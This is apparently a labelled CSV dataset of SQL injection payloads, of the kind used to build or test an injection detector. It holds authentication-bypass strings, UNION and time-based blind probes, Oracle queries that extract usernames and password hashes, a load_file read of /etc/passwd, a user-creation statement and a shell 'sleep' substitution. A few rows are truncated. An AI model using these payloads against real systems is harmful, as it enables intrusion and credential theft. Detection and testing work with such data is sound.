Payloads,Types
""" or pg_sleep  (  __TIME__  )  --",sql
create user name identified by pass123 temporary tablespace temp default tablespace users;,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",sql
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,sql
select * from users where id  =  1 +$+ or 1  =  1 -- 1,sql
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",sql
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",sql
? or 1  =  1 --,sql
 )   or   (  'a'  =  'a,sql
admin' or 1  =  1#,sql
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",sql
or 1  =  1 --,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",sql
distinct,sql
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',sql
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",sql
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,sql
"admin"" or ""1""  =  ""1""--",sql
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",sql
insert,sql
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",sql
"or 1  =  1 or """"  =  ",sql
/**/or/**/1/**/  =  /**/1,sql
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",sql
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",sql
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",sql
or 1  =  1/*,sql
%27 or 1  =  1,sql
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",sql
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",sql
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",sql
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,sql
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",sql
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",sql
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',sql
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",sql
or 1 --',sql
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",sql
"admin"" or 1  =  1#",sql
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",sql
\x27UNION SELECT,sql
PRINT,sql
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",sql
or 1  =  1--,sql
1 or pg_sleep  (  __TIME__  )  --,sql
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",sql
admin'  )   or   (  '1'  =  '1'/*,sql
or 2 between 1 and 3,sql
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",sql
admin' or '1'  =  '1,sql
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,sql
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
""" or 0  =  0 --",sql
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",sql
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,sql
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",sql
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",sql
char%4039%41%2b%40SELECT,sql
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",sql
admin'  )   or   (  '1'  =  '1,sql
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,sql
"or 0  =  0 #""",sql
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",sql
  )   or   (  'x'  =  'x,sql
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",sql
$  (  sleep 50  ) ,sql
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",sql
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",sql
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",sql
"""a"""" or 1  =  1--""",sql
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",sql
1 and user_name  (    )     =   'dbo',sql
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",sql
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",sql
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',sql
select * from users where id  =  1 +$+. or 1  =  1 -- 1,sql
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sql
or 1  =  1 or ''  =  ',sql
select * from users where id  =  1   or 1  =  1 -- 1,sql
or 'text' > 't',sql
